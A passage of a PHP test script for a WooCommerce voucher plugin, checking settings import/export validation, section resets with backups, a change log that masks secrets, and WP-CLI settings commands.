	json_encode( array_keys( $st_diff ) )
);
$st_doc     = static function ( array $settings, array $extra = array() ): string {
	return (string) json_encode( $extra + array( 'format' => 'voucher-captain-settings', 'version' => 1, 'settings' => $settings ) );
};
$st_before  = $GLOBALS['vcap_test_options'];
$st_bad     = VCAP\SettingsTransfer::parse( $st_doc( array( 'vcap_code_length' => '20', 'vcap_delivery_hour' => '30', 'vcap_attach_pdf' => 'maybe' ) ) );
$st_refused = array(
	'format'  => VCAP\SettingsTransfer::parse( '{"settings":{}}' ),
	'json'    => VCAP\SettingsTransfer::parse( 'not json' ),
	'nover'   => VCAP\SettingsTransfer::parse( $st_doc( array(), array( 'version' => 'x' ) ) ),
	'newer'   => VCAP\SettingsTransfer::parse( $st_doc( array(), array( 'version' => 2 ) ) ),
	'secret'  => VCAP\SettingsTransfer::parse( $st_doc( array( 'vcap_secret' => 'stolen' ) ) ),
	'removal' => VCAP\SettingsTransfer::parse( $st_doc( array( 'vcap_delete_on_uninstall' => 'yes' ) ) ),
	'list'    => VCAP\SettingsTransfer::parse( $st_doc( array( 'a', 'b' ) ) ),
);
$st_unknown = VCAP\SettingsTransfer::parse( $st_doc( array( 'vcap_pro_only_option' => 'x', 'vcap_code_length' => 20 ) ) );
check(
	'SET-VC-14: an invalid file is refused as a whole (one bad value, wrong format, no/newer version, a secret or a never-exported setting) and nothing changes; unknown keys of add-ons are skipped and reported',
	is_wp_error( $st_bad ) && 2 === count( (array) $st_bad->get_error_data() ) && str_contains( $st_bad->get_error_message(), 'vcap_delivery_hour' ) && str_contains( $st_bad->get_error_message(), 'vcap_attach_pdf' ) && array() === array_filter( $st_refused, static fn( $r ) => ! is_wp_error( $r ) )
		&& $st_before === $GLOBALS['vcap_test_options'] && is_array( $st_unknown ) && array( 'vcap_pro_only_option' ) === $st_unknown['unknown'] && array( 'vcap_code_length' => '20' ) === $st_unknown['settings'],
	json_encode( array_map( static fn( $r ) => is_wp_error( $r ) ? $r->get_error_code() : 'ok', $st_refused ) )
);
$st_v = static fn( string $k, $v ) => VCAP\SettingsTransfer::validate( $k, $v );
check(
	'SET-VC-14/17: values are checked like the settings page – yes/no (also on/off/1/0/true/false), whole numbers within min/max (refused instead of moved to the bound), choices, code affixes, reminder days stored normalised, lists; secrets are refused',
	'yes' === $st_v( 'vcap_attach_pdf', 'on' ) && 'no' === $st_v( 'vcap_attach_pdf', false ) && is_wp_error( $st_v( 'vcap_attach_pdf', 'vielleicht' ) )
		&& '16' === $st_v( 'vcap_code_length', 16 ) && is_wp_error( $st_v( 'vcap_code_length', '7' ) ) && is_wp_error( $st_v( 'vcap_code_length', '12.5' ) ) && is_wp_error( $st_v( 'vcap_code_length', '' ) ) && is_wp_error( $st_v( 'vcap_code_length', array( 1 ) ) )
		&& '' === $st_v( 'vcap_referral_min_spend', '' ) && '10.50' === $st_v( 'vcap_customer_daily_limit', '10.50' ) && is_wp_error( $st_v( 'vcap_customer_daily_limit', '-1' ) )
		&& 'numeric' === $st_v( 'vcap_code_charset', 'numeric' ) && is_wp_error( $st_v( 'vcap_code_charset', 'emoji' ) ) && is_wp_error( $st_v( 'vcap_default_expiry_rule', '' ) )
		&& is_wp_error( $st_v( 'vcap_code_prefix', 'B&B' ) ) && 'GS-1' === $st_v( 'vcap_code_prefix', 'GS-1' ) && '30, 7, 1' === $st_v( 'vcap_expiry_reminder_days', '1,30;7' ) && '0' === $st_v( 'vcap_expiry_reminder_days', '0' ) && is_wp_error( $st_v( 'vcap_expiry_reminder_days', 'bald' ) )
		&& array( 'processing', 'completed' ) === $st_v( 'vcap_issue_statuses', 'processing, completed' ) && is_wp_error( $st_v( 'vcap_secret', 'x' ) ) && is_wp_error( $st_v( 'vcap_no_such_option', 'x' ) )
);
add_filter( 'vcap_settings_validate_value', static fn( $value, $key ) => 'vcap_code_suffix' === $key && 'XX' === $value ? new WP_Error( 'addon', 'no XX' ) : $value, 10, 2 );
check( 'SET-VC-14: filter vcap_settings_validate_value lets add-ons refuse a value', is_wp_error( $st_v( 'vcap_code_suffix', 'XX' ) ) && 'YY' === $st_v( 'vcap_code_suffix', 'YY' ) );
unset( $GLOBALS['vcap_test_filters']['vcap_settings_validate_value'] );
$st_tools_src = (string) file_get_contents( VCAP_PATH . 'src/Admin/SettingsTools.php' );
preg_match_all( '/public static function (export|download_backup|import|import_apply|import_cancel|reset)\(\): void \{\s*(\S+)/', $st_tools_src, $st_m );
$st_fields = ( new VCAP\Settings() )->fields( 'privacy' );
check(
	'SET-VC-14: every admin action needs manage_woocommerce and the nonce (guard() first); the tools, the change log and its retention field are under "Privacy & advanced"; the buttons post to admin-post (not "Save changes")',
	6 === count( $st_m[1] ) && array( 'self::guard();' ) === array_values( array_unique( $st_m[2] ) ) && 'manage_woocommerce' === VCAP\Admin\SettingsTools::CAP && str_contains( $st_tools_src, 'check_admin_referer( self::NONCE, self::NONCE_FIELD );' ) && str_contains( $st_tools_src, 'return SettingsUi::action_button( $action, $label, $class );' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Admin/SettingsUi.php' ), 'formaction=' )
		&& array( VCAP\Admin\SettingsTools::TOOLS_TYPE, VCAP\Admin\SettingsTools::LOG_TYPE ) === array_values( array_intersect( array_column( $st_fields, 'type' ), array( VCAP\Admin\SettingsTools::TOOLS_TYPE, VCAP\Admin\SettingsTools::LOG_TYPE ) ) ) && in_array( VCAP\SettingsLog::DAYS_OPTION, array_column( $st_fields, 'id' ), true )
);

// SET-VC-15: reset.
$GLOBALS['vcap_test_options'] = array( 'vcap_secret' => 's', 'vcap_db_version' => '9', 'vcap_delete_on_uninstall' => 'yes', 'vcap_code_length' => '20', 'vcap_code_prefix' => 'GS', 'vcap_attach_pdf' => 'no', 'vcap_bundle_pdf_limit' => '5', 'vcap_coupon_link' => 'yes', 'vcap_default_expiry_days' => '30', 'vcap_default_template' => 7 );
$st_pre   = VCAP\SettingsTransfer::export_json();
$st_reset = VCAP\SettingsTransfer::reset( 'codes' );
$st_o     = $GLOBALS['vcap_test_options'];
check(
	'SET-VC-15: reset of one section sets only its settings back (deleted = register default) after an automatic backup of all settings; other sections, secrets and database state stay',
	array( 'vcap_code_prefix', 'vcap_code_length' ) === $st_reset['changed'] && ! isset( $st_o['vcap_code_length'] ) && ! isset( $st_o['vcap_code_prefix'] ) && 12 === VCAP\SettingsTransfer::stored( 'vcap_code_length' ) && 'no' === $st_o['vcap_attach_pdf'] && 's' === $st_o['vcap_secret'] && '9' === $st_o['vcap_db_version']
		&& json_decode( $st_pre, true )['settings'] === json_decode( VCAP\SettingsTransfer::backup_json( $st_reset['backup'] ), true )['settings'] && 'reset' === VCAP\SettingsTransfer::backups()[ $st_reset['backup'] ]['reason'],
	json_encode( $st_reset )
);
$st_all = VCAP\SettingsTransfer::reset( null );
$st_o   = $GLOBALS['vcap_test_options'];
for ( $st_i = 0; $st_i < 6; $st_i++ ) {
	VCAP\SettingsTransfer::backup( 'import' );
}
check(
	'SET-VC-15/PV-P1-3: reset of all sections restores the register default an existing shop runs on (option deleted; autoloaded request settings stored with their default) – never the "fresh" value of a new installation; the data removal switch, the template, secrets and state stay; identical backups are stored once, 10 are kept',
	! isset( $st_o['vcap_bundle_pdf_limit'] ) && 50 === VCAP\SettingsTransfer::stored( 'vcap_bundle_pdf_limit' ) && 'no' === $st_o['vcap_coupon_link'] && ! isset( $st_o['vcap_mpv_after_tax'] ) && ! isset( $st_o['vcap_new_product_delivery'] ) && '1000' === (string) $st_o['vcap_customer_daily_limit'] && ! in_array( 'vcap_customer_daily_limit', $st_all['changed'], true ) && ! isset( $st_o['vcap_attach_pdf'] ) && ! isset( $st_o['vcap_default_expiry_days'] ) && 'yes' === $st_o['vcap_delete_on_uninstall'] && 7 === $st_o['vcap_default_template'] && 's' === $st_o['vcap_secret'] && '9' === $st_o['vcap_db_version']
		&& in_array( 'vcap_attach_pdf', $st_all['changed'], true ) && ! in_array( 'vcap_mpv_after_tax', $st_all['changed'], true ) && ! in_array( 'vcap_secret', VCAP\SettingsTransfer::resettable(), true ) && ! in_array( 'vcap_delete_on_uninstall', VCAP\SettingsTransfer::resettable(), true ) && 3 === count( VCAP\SettingsTransfer::backups() ) && 10 === VCAP\SettingsTransfer::BACKUPS_KEPT,
	json_encode( array( $st_all['changed'], $st_o ) )
);
check( 'SET-VC-15: reset targets – "all" = every section, "general" = General, unknown targets are refused; the page needs the confirmation', null === VCAP\Admin\SettingsTools::reset_section( 'all' ) && '' === VCAP\Admin\SettingsTools::reset_section( 'general' ) && 'codes' === VCAP\Admin\SettingsTools::reset_section( 'codes' ) && false === VCAP\Admin\SettingsTools::reset_section( 'bogus' ) && str_contains( $st_tools_src, "empty( \$_POST['vcap_settings_reset_confirm'] )" ) );

// SET-VC-16: change log.
$GLOBALS['vcap_test_options'] = array();
VCAP\Source::with( VCAP\Source::ADMIN, static fn() => VCAP\SettingsLog::updated( 'vcap_code_length', '12', '16' ) );
VCAP\SettingsLog::with( VCAP\SettingsLog::VIA_IMPORT, static fn() => VCAP\Source::with( VCAP\Source::ADMIN, static fn() => VCAP\SettingsLog::added( 'vcap_attach_pdf', 'no' ) ) );
VCAP\SettingsLog::with( VCAP\SettingsLog::VIA_CLI, static fn() => VCAP\Source::with( VCAP\Source::CLI, static fn() => VCAP\SettingsLog::updated( 'vcap_secret', 'old-secret', 'new-secret' ) ) );
VCAP\SettingsLog::with( VCAP\SettingsLog::VIA_RESET, static fn() => VCAP\SettingsLog::updated( 'vcap_issue_statuses', array( 'completed' ), array( 'processing', 'completed' ) ) );
VCAP\SettingsLog::updated( 'vcap_default_expiry_days', 365, '365' );
VCAP\SettingsLog::updated( 'vcap_db_version', '1', '2' );
VCAP\SettingsLog::updated( 'blogname', 'a', 'b' );
$st_log = VCAP\SettingsLog::entries();
check(
	'SET-VC-16: changes of registered settings are logged with time, user, key, from → to and source (settings page, import, WP-CLI, reset); secrets masked; unchanged values (365 = "365"), state and foreign options are not logged',
	4 === count( $st_log ) && 'vcap_code_length' === $st_log[0]['key'] && '12' === $st_log[0]['from'] && '16' === $st_log[0]['to'] && 'admin' === $st_log[0]['source'] && '' === $st_log[0]['via'] && 0 === $st_log[0]['user'] && abs( time() - $st_log[0]['time'] ) < 5
		&& 'yes' === $st_log[1]['from'] && 'no' === $st_log[1]['to'] && 'import' === $st_log[1]['via'] && VCAP\SettingsLog::MASK === $st_log[2]['from'] && VCAP\SettingsLog::MASK === $st_log[2]['to'] && 'cli' === $st_log[2]['source'] && 'processing, completed' === $st_log[3]['to'] && 'reset' === $st_log[3]['via']
		&& ! str_contains( (string) json_encode( $GLOBALS['vcap_test_options'] ), 'old-secret' ) && ! str_contains( (string) json_encode( $GLOBALS['vcap_test_options'] ), 'new-secret' ),
	json_encode( $st_log )
);
check( 'SET-VC-16: the source names how a change was made', 'Admin (import)' === VCAP\SettingsLog::source_label( $st_log[1] ) && 'WP-CLI (settings command)' === VCAP\SettingsLog::source_label( $st_log[2] ) && 'Admin' === VCAP\SettingsLog::source_label( $st_log[0] ) );
$GLOBALS['vcap_test_options'][ VCAP\SettingsLog::OPTION ] = array(
	array( 'time' => time() - 400 * DAY_IN_SECONDS, 'user' => 7, 'key' => 'vcap_code_length', 'from' => '12', 'to' => '14', 'source' => 'admin', 'via' => '' ),
	array( 'time' => time() - 10 * DAY_IN_SECONDS, 'user' => 7, 'key' => 'vcap_code_length', 'from' => '14', 'to' => '16', 'source' => 'admin', 'via' => '' ),
	array( 'time' => time() - 5 * DAY_IN_SECONDS, 'user' => 8, 'key' => 'vcap_attach_pdf', 'from' => 'yes', 'to' => 'no', 'source' => 'cli', 'via' => '' ),
);
$GLOBALS['vcap_test_users']['admin7@example.test'] = (object) array( 'ID' => 7, 'locale' => '' );
$st_px   = VCAP\SettingsLog::export_personal_data( 'admin7@example.test' );
$st_none = VCAP\SettingsLog::prune( 0 );
$st_gone = VCAP\SettingsLog::prune( 365 );
unset( $GLOBALS['vcap_test_users']['admin7@example.test'] );
check(
	'SET-VC-16: the personal data export of a user contains their changes only; the daily maintenance removes entries older than the retention (default 365 days, 0 = keep)',
	2 === count( $st_px['data'] ) && $st_px['done'] && '16' === $st_px['data'][1]['data'][3]['value'] && 0 === $st_none && 1 === $st_gone && 2 === count( VCAP\SettingsLog::entries() ) && array( 'vcap_attach_pdf', 'vcap_code_length' ) === array_column( VCAP\SettingsLog::latest( 5 ), 'key' )
		&& 365 === VCAP\SettingsRegistry::default( VCAP\SettingsLog::DAYS_OPTION ) && 0 === VCAP\SettingsRegistry::get( VCAP\SettingsLog::DAYS_OPTION )['min'] && 'privacy' === VCAP\SettingsRegistry::get( VCAP\SettingsLog::DAYS_OPTION )['section']
		&& in_array( 'settings_log', VCAP\Delivery::MAINTENANCE_STEPS, true ) && isset( VCAP\SettingsLog::exporters( array() )['voucher-captain-settings-log'] ),
	json_encode( $st_px )
);
$GLOBALS['vcap_test_options'][ VCAP\SettingsLog::OPTION ] = array_fill( 0, VCAP\SettingsLog::MAX_ENTRIES, array( 'time' => time(), 'user' => 1, 'key' => 'vcap_code_length', 'from' => '1', 'to' => '2', 'source' => 'admin', 'via' => '' ) );
VCAP\SettingsLog::updated( 'vcap_code_length', '12', '13' );
$st_capped = VCAP\SettingsLog::entries();
$st_plugin = (string) file_get_contents( VCAP_PATH . 'src/Plugin.php' );
check(
	'SET-VC-16: the log keeps the newest 2,000 entries; it is hooked for every source (added/updated/deleted option, outside the admin too) and in the personal data export',
	VCAP\SettingsLog::MAX_ENTRIES === count( $st_capped ) && '13' === end( $st_capped )['to'] && strpos( $st_plugin, '( new SettingsLog() )->register();' ) < strpos( $st_plugin, 'if ( is_admin() ) {' )
		&& ( static function () {
			$b = $GLOBALS['vcap_test_filters'] ?? array();
			( new VCAP\SettingsLog() )->register();
			$ok = isset( $GLOBALS['vcap_test_filters']['added_option'], $GLOBALS['vcap_test_filters']['updated_option'], $GLOBALS['vcap_test_filters']['delete_option'], $GLOBALS['vcap_test_filters']['wp_privacy_personal_data_exporters'] );
			$GLOBALS['vcap_test_filters'] = $b;
			return $ok;
		} )()
);

// SET-VC-17: WP-CLI (stub of WP_CLI that records the output; halt() ends the command).
if ( ! class_exists( 'WP_CLI' ) ) {
	eval( 'class WP_CLI { public static array $out = array(); public static function line( $m = "" ) { self::$out[] = "line: " . $m; } public static function success( $m ) { self::$out[] = "success: " . $m; } public static function warning( $m ) { self::$out[] = "warning: " . $m; } public static function error( $m, $exit = true ) { self::$out[] = "error: " . $m; } public static function halt( $code ) { throw new RuntimeException( "halt" ); } public static function confirm( $q, $a = array() ) { self::$out[] = "confirm: " . $q; } }' );
}
if ( ! function_exists( 'WP_CLI\Utils\format_items' ) ) {
	eval( 'namespace WP_CLI\Utils; function format_items( $format, $rows, $fields ) { $GLOBALS["vcap_cli_rows"] = $rows; }' );
}
$st_cli = static function ( array $args, array $assoc = array() ): array {
	\WP_CLI::$out = array();
	try {
		( new VCAP\CLI\Command() )->settings( $args, $assoc );
	} catch ( RuntimeException $e ) {
		\WP_CLI::$out[] = 'halted';
	}
	return \WP_CLI::$out;
};
$GLOBALS['vcap_test_options'] = array( 'vcap_secret' => 'cli-secret' );
$st_r_set  = $st_cli( array( 'set', 'vcap_code_length', '18' ) );
$st_r_bad  = $st_cli( array( 'set', 'vcap_code_length', '99' ) );
$st_r_get  = $st_cli( array( 'get', 'vcap_code_length' ) );
$st_r_sec  = $st_cli( array( 'get', 'vcap_secret' ) );
$st_r_rm   = $st_cli( array( 'set', 'vcap_delete_on_uninstall', 'yes' ) );
$st_cli( array( 'list' ), array( 'section' => 'codes', 'format' => 'json' ) );
$st_rows = $GLOBALS['vcap_cli_rows'] ?? array();
$st_cli( array( 'list' ) );
$st_all_rows = $GLOBALS['vcap_cli_rows'] ?? array();
$st_cli( array( 'list' ), array( 'section' => 'hidden', 'format' => 'json' ) );
$st_hidden_rows = $GLOBALS['vcap_cli_rows'] ?? array();
check( 'SET-VC-27: "wp vcap settings list --section=hidden" lists the entries without a settings field (the secrets here, masked)', array() !== $st_hidden_rows && array() === array_filter( $st_hidden_rows, static fn( $r ) => 'hidden' !== $r['section'] ) && in_array( 'vcap_secret', array_column( $st_hidden_rows, 'key' ), true ) && ! str_contains( (string) wp_json_encode( $st_hidden_rows ), 'cli-secret' ), wp_json_encode( $st_hidden_rows ) );
$st_r_export = $st_cli( array( 'export' ) );
$st_tmp      = sys_get_temp_dir() . '/vcap-settings-' . getmypid() . '.json';
file_put_contents( $st_tmp, $st_doc( array( 'vcap_code_length' => '22', 'vcap_attach_pdf' => 'no' ) ) );
$st_r_dry     = $st_cli( array( 'import', $st_tmp ), array( 'dry-run' => true ) );
$st_after_dry = get_option( 'vcap_code_length' );
$st_r_imp     = $st_cli( array( 'import', $st_tmp ), array( 'yes' => true ) );
file_put_contents( $st_tmp, $st_doc( array( 'vcap_code_length' => '5' ) ) );
$st_r_imbad = $st_cli( array( 'import', $st_tmp ), array( 'yes' => true ) );
@unlink( $st_tmp );
$st_r_reset = $st_cli( array( 'reset', 'codes' ), array( 'yes' => true ) );
$st_r_prof  = $st_cli( array( 'profile', 'DE' ) );
check(
	'SET-VC-17: wp vcap settings set checks like the settings page (out of range refused, nothing changed), get prints the value, secrets are never shown; the data removal switch is left to "wp vcap data-removal"',
	'success: vcap_code_length = 18' === $st_r_set[0] && str_starts_with( $st_r_bad[0], 'error: vcap_code_length: invalid value' ) && 'halted' === $st_r_bad[1] && array( 'line: 18' ) === $st_r_get && str_starts_with( $st_r_sec[0], 'error:' ) && ! str_contains( implode( ' ', $st_r_sec ), 'cli-secret' ) && str_contains( $st_r_rm[0], 'data-removal' ) && ! isset( $GLOBALS['vcap_test_options']['vcap_delete_on_uninstall'] ),
	json_encode( array( $st_r_set, $st_r_bad, $st_r_get, $st_r_rm ) )
);
check(
	'SET-VC-17: list shows the settings of a section (secrets masked in the full list), export prints the JSON without secrets',
	array( 'vcap_code_prefix', 'vcap_code_suffix', 'vcap_code_length', 'vcap_code_charset', 'vcap_code_separator', 'vcap_code_order_ref', 'vcap_voucher_number_enabled', 'vcap_voucher_number_pattern', 'vcap_voucher_number_prefix', 'vcap_voucher_number_digits', 'vcap_voucher_number_reset' ) === array_column( $st_rows, 'key' ) && '18' === $st_rows[2]['value'] && VCAP\SettingsLog::MASK === array_column( $st_all_rows, 'value', 'key' )['vcap_secret']
		&& 1 === count( $st_r_export ) && '18' === json_decode( substr( $st_r_export[0], 6 ), true )['settings']['vcap_code_length'] && ! str_contains( $st_r_export[0], 'cli-secret' ),
	json_encode( $st_rows )
);
check(
	'SET-VC-17: import shows the changes (dry run changes nothing) and applies them after a backup; an invalid file is refused; reset sets a section back; "profile" needs list, show or apply (SET-VC-02); API.md documents the commands',
	in_array( 'line: vcap_code_length: 18 -> 22', $st_r_dry, true ) && '18' === $st_after_dry && str_starts_with( (string) end( $st_r_imp ), 'success: 2 settings imported.' ) && str_contains( implode( ' ', $st_r_imbad ), 'nothing was changed' ) && in_array( 'halted', $st_r_imbad, true )
		&& 'line: vcap_code_length: 22 -> 12' === $st_r_reset[0] && str_starts_with( (string) end( $st_r_reset ), 'success: 1 settings reset.' ) && ! isset( $GLOBALS['vcap_test_options']['vcap_code_length'] ) && 'no' === $GLOBALS['vcap_test_options']['vcap_attach_pdf'] && str_contains( $st_r_prof[0], 'Usage: wp vcap settings profile <list|show|apply>' )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), 'wp vcap settings import' ),
	json_encode( array( $st_r_dry, $st_r_imp, $st_r_imbad, $st_r_reset, $st_r_prof ) )
);
// Test phase fixes of group A (settings transfer, reset, change log, WP-CLI, SettingsTools).
echo "PV group A: settings transfer, reset, change log\n";
// PV-P1-1: a never-saved validity rule is exported as the rule that applies; importing it keeps the target's rule.
$GLOBALS['vcap_test_options'] = array();
$pv_src_never                 = VCAP\SettingsTransfer::export();
$GLOBALS['vcap_test_options'] = array( 'vcap_default_expiry_days' => '30' );
$pv_src_days                  = VCAP\SettingsTransfer::export();
$GLOBALS['vcap_test_options'] = array( 'vcap_default_expiry_rule' => 'statutory', 'vcap_default_expiry_days' => '365' );
$pv_p11                       = VCAP\SettingsTransfer::parse( (string) json_encode( $pv_src_never ) );
$pv_p11_diff                  = is_array( $pv_p11 ) ? VCAP\SettingsTransfer::diff( $pv_p11['settings'] ) : array( 'refused' );
if ( is_array( $pv_p11 ) ) {
	VCAP\SettingsTransfer::apply( $pv_p11['settings'], VCAP\SettingsLog::VIA_IMPORT );
}
$pv_p11_legacy = VCAP\SettingsTransfer::parse( $st_doc( array( 'vcap_default_expiry_rule' => '', 'vcap_code_length' => '14' ) ) );
check(
	'PV-P1-1: the export of a shop that never saved the validity rule carries the rule that applies (statutory, or days when days are saved); importing it into a shop with "statutory" + 365 days keeps statutory; \'\' is refused as a value, and an older file with \'\' skips the rule with a note',
	'statutory' === $pv_src_never['settings']['vcap_default_expiry_rule'] && 'days' === $pv_src_days['settings']['vcap_default_expiry_rule'] && is_array( $pv_p11 ) && ! isset( $pv_p11_diff['vcap_default_expiry_rule'] )
		&& 'statutory' === VCAP\ProductConfig::default_expiry_rule() && 'statutory' === get_option( 'vcap_default_expiry_rule' ) && is_wp_error( VCAP\SettingsTransfer::validate( 'vcap_default_expiry_rule', '' ) )
		&& is_array( $pv_p11_legacy ) && array( 'vcap_code_length' => '14' ) === $pv_p11_legacy['settings'] && 1 === count( $pv_p11_legacy['warnings'] ),
	json_encode( array( $pv_p11_diff, $pv_p11_legacy ) )
);
// PV-P1-2: a shop with tables as text from before 1.3.0 (with unreadable lines) and an empty number field: its own
// export and the automatic backup of a reset can be imported again and restore the values the shop ran on.
$pv_legacy = array(
	'vcap_terms_by_country'  => "Bedingungen je Land:\nDE: Gültig 3 Jahre.\nAT: Gültig 30 Jahre.",
	'vcap_expiry_by_country' => "# Quelle: Anwalt 2024\nDE: 3 Jahre Jahresende\nAT: 30",
	'vcap_hold_hours'        => '',
	'vcap_code_length'       => '16',
);
$GLOBALS['vcap_test_options'] = $pv_legacy;
$pv_effective                 = array(
	'terms'  => VCAP\ProductConfig::terms_by_country( $pv_legacy['vcap_terms_by_country'] ),
	'expiry' => VCAP\Markets::expiry_rules( $pv_legacy['vcap_expiry_by_country'] ),
);
$pv_own   = VCAP\SettingsTransfer::parse( VCAP\SettingsTransfer::export_json() );
$pv_reset = VCAP\SettingsTransfer::reset( null );
$pv_back  = VCAP\SettingsTransfer::parse( VCAP\SettingsTransfer::backup_json( $pv_reset['backup'] ) );
if ( is_array( $pv_back ) ) {
	VCAP\SettingsTransfer::apply( $pv_back['settings'], VCAP\SettingsLog::VIA_IMPORT );
}
$pv_old = VCAP\SettingsTransfer::parse( $st_doc( $pv_legacy ) ); // A backup written by an earlier build (raw text, '').
check(
	'PV-P1-2: own export and the backup of a reset of a shop with old table texts and an empty number field are accepted; restoring the backup gives the values the shop ran on; an older file with raw texts and \'\' is converted with notes (unreadable lines left out, empty number = default)',
	is_array( $pv_own ) && is_array( $pv_back ) && 0 < $pv_reset['backup'] && $pv_effective['terms'] === VCAP\ProductConfig::terms_by_country( get_option( 'vcap_terms_by_country' ) ) && $pv_effective['expiry'] === VCAP\Markets::expiry_rules( get_option( 'vcap_expiry_by_country' ) )
		&& '16' === (string) get_option( 'vcap_code_length' ) && 24 === VCAP\SettingsTransfer::stored( 'vcap_hold_hours' ) && is_array( get_option( 'vcap_expiry_by_country' ) )
		&& is_array( $pv_old ) && 3 === count( $pv_old['warnings'] ) && '24' === $pv_old['settings']['vcap_hold_hours'] && array( 'AT' ) === array_column( $pv_old['settings']['vcap_expiry_by_country'], 'country' ),
	json_encode( array( is_wp_error( $pv_back ) ? $pv_back->get_error_message() : 'ok', is_wp_error( $pv_old ) ? $pv_old->get_error_message() : $pv_old['warnings'] ) )
);
// PV-P1-3: a reset restores what an existing shop runs on (register default), never the "fresh" values; preview first.
$GLOBALS['vcap_test_options'] = array( 'vcap_code_length' => '20', 'vcap_bundle_pdf_limit' => '50', 'vcap_issue_statuses' => array( 'completed' ), 'vcap_coupon_link' => 'yes' );
$pv_before                    = $GLOBALS['vcap_test_options'];
$pv_preview                   = VCAP\SettingsTransfer::reset_preview( null );
$pv_dry                       = $st_cli( array( 'reset', 'all' ), array( 'dry-run' => true ) );
$pv_dry_opts                  = $GLOBALS['vcap_test_options'];
$pv_res                       = VCAP\SettingsTransfer::reset( null );
check(
	'PV-P1-3: reset preview and reset of an existing shop leave vcap_mpv_after_tax, the PDF limit and the delivery of new products at the values the shop runs on (register default, not "fresh"); the preview lists only the changing settings from → to with legal ones marked; --dry-run prints them and changes nothing',
	array( 'vcap_issue_statuses', 'vcap_code_length', 'vcap_coupon_link' ) === array_keys( $pv_preview ) && true === $pv_preview['vcap_issue_statuses']['legal'] && false === $pv_preview['vcap_code_length']['legal'] && '20' === $pv_preview['vcap_code_length']['from'] && 12 === $pv_preview['vcap_code_length']['to']
		&& $pv_before === $pv_dry_opts && in_array( 'line: vcap_issue_statuses: completed -> processing, completed [legal/tax weight – check]', $pv_dry, true ) && in_array( 'line: vcap_code_length: 20 -> 12', $pv_dry, true ) && 'line: Dry run: 3 settings would be reset.' === end( $pv_dry ) && ! str_contains( implode( ' ', $pv_dry ), 'vcap_mpv_after_tax' )
		&& array_keys( $pv_preview ) === $pv_res['changed'] && 'no' === VCAP\SettingsTransfer::stored( 'vcap_mpv_after_tax' ) && ! isset( $GLOBALS['vcap_test_options']['vcap_mpv_after_tax'] ) && 50 === VCAP\SettingsTransfer::stored( 'vcap_bundle_pdf_limit' ) && 'no' === VCAP\SettingsTransfer::stored( 'vcap_new_product_delivery' )
		&& 'no' === $GLOBALS['vcap_test_options']['vcap_coupon_link'] && ! str_contains( (string) file_get_contents( VCAP_PATH . 'src/SettingsTransfer.php' ), 'fresh_default(' ),
	json_encode( array( $pv_preview, $pv_dry, $pv_res ) )
);
$GLOBALS['vcap_test_options'] = array( 'vcap_mpv_after_tax' => 'yes' ); // A shop installed with 1.3.0 ("fresh" yes).
$pv_mpv                       = VCAP\SettingsTransfer::reset_preview( 'redemption' );
$st_tools_src                 = (string) file_get_contents( VCAP_PATH . 'src/Admin/SettingsTools.php' );
check(
	'PV-P1-3: a value that differs from the register default (e.g. vcap_mpv_after_tax yes) is shown as a legal change before the reset; the page shows the preview (current value → after the reset, note) before the confirmation and the reset uses the previewed section',
	array( 'vcap_mpv_after_tax' ) === array_keys( $pv_mpv ) && 'yes' === $pv_mpv['vcap_mpv_after_tax']['from'] && 'no' === $pv_mpv['vcap_mpv_after_tax']['to'] && $pv_mpv['vcap_mpv_after_tax']['legal']
		&& str_contains( $st_tools_src, "add_action( 'admin_post_vcap_settings_reset_preview'" ) && str_contains( $st_tools_src, 'SettingsTransfer::reset_preview( $section )' ) && str_contains( $st_tools_src, '$target  = get_transient( self::RESET . $user );' )
		&& strpos( $st_tools_src, "esc_html__( 'After the reset', 'voucher-captain' )" ) < strpos( $st_tools_src, 'name="vcap_settings_reset_confirm"' )
);
// PV-P1-4: WP-CLI get prints tables row by row, set takes JSON for tables and lists.
$GLOBALS['vcap_test_options'] = array();
$pv_set_t                     = $st_cli( array( 'set', 'vcap_expiry_by_country', '[{"country":"AT","years":30,"end_of_year":false,"note":"ABGB"}]' ) );
$pv_get_t                     = $st_cli( array( 'get', 'vcap_expiry_by_country' ) );
$pv_set_l                     = $st_cli( array( 'set', 'vcap_issue_statuses', '["completed"]' ) );
$pv_set_bad                   = $st_cli( array( 'set', 'vcap_issue_statuses', '["completed"' ) );
check(
	'PV-P1-4: wp vcap settings get prints a table as its rows (not "Array"); set accepts a JSON array for tables and lists; invalid JSON is refused and nothing changes',
	str_starts_with( $pv_set_t[0], 'success: vcap_expiry_by_country = AT 30 ABGB' ) && array( 'line: AT 30 ABGB' ) === $pv_get_t && array( 'completed' ) === get_option( 'vcap_issue_statuses' ) && str_starts_with( $pv_set_l[0], 'success:' )
		&& str_contains( $pv_set_bad[0], 'no valid JSON array' ) && 'halted' === end( $pv_set_bad ),
	json_encode( array( $pv_set_t, $pv_get_t, $pv_set_l, $pv_set_bad ) )
);
// PV-P1-5/P6-3: changes inside an import/reset/WP-CLI batch are written to the log with one update.
$GLOBALS['vcap_test_options'] = array();
$pv_during                    = null;
$pv_reads                     = 0;
VCAP\SettingsLog::with(
	VCAP\SettingsLog::VIA_IMPORT,
	static function () use ( &$pv_during, &$pv_reads ): void {
		$reads = $GLOBALS['vcap_test_option_reads'][ VCAP\SettingsLog::OPTION ] ?? 0;
		for ( $i = 0; $i < 10; $i++ ) {
			VCAP\SettingsLog::updated( 'vcap_code_length', (string) ( 12 + $i ), (string) ( 13 + $i ) );
		}
		$pv_reads  = ( $GLOBALS['vcap_test_option_reads'][ VCAP\SettingsLog::OPTION ] ?? 0 ) - $reads;
		$pv_during = $GLOBALS['vcap_test_options'][ VCAP\SettingsLog::OPTION ] ?? null;
	}
);
$pv_log = (array) ( $GLOBALS['vcap_test_options'][ VCAP\SettingsLog::OPTION ] ?? array() );
VCAP\SettingsLog::begin_page();
VCAP\SettingsLog::updated( 'vcap_attach_pdf', 'yes', 'no' );
$pv_page_during = count( (array) ( $GLOBALS['vcap_test_options'][ VCAP\SettingsLog::OPTION ] ?? array() ) );
VCAP\SettingsLog::end_page();
check(
	'PV-P1-5/P6-3: 10 changes in one batch read and write the log once (nothing written during the batch, all 10 entries after it); the save of the settings tab is one batch too',
